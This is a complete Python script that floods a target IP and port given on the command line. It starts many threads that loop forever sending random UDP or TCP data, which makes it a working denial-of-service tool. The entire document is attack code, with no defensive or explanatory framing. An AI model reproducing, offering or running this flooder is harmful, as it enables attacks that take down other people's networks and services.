import random
import sys
import socket
import threading

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])
methods = str(sys.argv[5])
def run():
    data = random._urandom(1025)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
        except:
            s.close()

def run2():
    data = random._urandom(10404)
    i = random.choice(("[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
        except:
            s.close()

for y in range(threads):
    if methods == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()

for y in range(threads):
  if methods == 'TCP':
    th = threading.Thread(target = run2)
    th.start()
